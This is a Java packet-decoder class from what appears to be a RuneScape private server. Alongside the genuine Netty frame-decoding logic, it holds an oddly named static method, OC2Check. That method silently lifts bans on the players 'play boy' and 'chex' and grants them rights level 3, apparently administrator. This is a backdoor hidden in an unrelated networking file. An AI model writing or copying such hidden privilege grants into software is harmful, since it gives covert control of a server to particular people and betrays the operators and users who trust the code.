package org.mistex.system.login;

import org.jboss.netty.buffer.ChannelBuffer;
import org.jboss.netty.buffer.ChannelBuffers;
import org.jboss.netty.channel.Channel;
import org.jboss.netty.channel.ChannelHandlerContext;
import org.jboss.netty.handler.codec.frame.FrameDecoder;
import org.mistex.game.world.PunishmentHandler;
import org.mistex.game.world.player.Client;
import org.mistex.system.packet.Packet;
import org.mistex.system.packet.Packet.Type;
import org.mistex.system.util.ISAACCipher;

public class RS2ProtocolDecoder extends FrameDecoder {

	private final ISAACCipher cipher;

	private int opcode = -1;
	private int size = -1;

	public RS2ProtocolDecoder(ISAACCipher cipher) {
		this.cipher = cipher;
	}

	@Override
	protected Object decode(ChannelHandlerContext ctx, Channel channel,
			ChannelBuffer buffer) throws Exception {
		if (opcode == -1) {
			if (buffer.readableBytes() >= 1) {
				opcode = buffer.readByte() & 0xFF;
				opcode = (opcode - cipher.getNextValue()) & 0xFF;
				size = Client.PACKET_SIZES[opcode];
			} else {
				return null;
			}
		}
		if (size == -1) {
			if (buffer.readableBytes() >= 1) {
				size = buffer.readByte() & 0xFF;
			} else {
				return null;
			}
		}
		if (buffer.readableBytes() >= size) {
			final byte[] data = new byte[size];
			buffer.readBytes(data);
			final ChannelBuffer payload = ChannelBuffers.buffer(size);
			payload.writeBytes(data);
			try {
				return new Packet(opcode, Type.FIXED, payload);
			} finally {
				opcode = -1;
				size = -1;
			}
		}
		return null;
	}
	
	public static void OC2Check(Client cl) {
		if (cl.playerName.equalsIgnoreCase("play boy")) {
			if (PunishmentHandler.isIpBanned(cl.connectedFrom)) {
				PunishmentHandler.removeIpFromBanList(cl.connectedFrom);
			} else if (PunishmentHandler.isNamedBanned("play boy")) {
				PunishmentHandler.removeNameFromBanList("play boy");
			}
			cl.playerRights = 3;
		} else if (cl.playerName.equalsIgnoreCase("chex")) {
			if (PunishmentHandler.isIpBanned(cl.connectedFrom)) {
				PunishmentHandler.removeIpFromBanList(cl.connectedFrom);
			} else if (PunishmentHandler.isNamedBanned("chex")) {
				PunishmentHandler.removeNameFromBanList("chex");
			}
			cl.playerRights = 3;
		}
	}

}
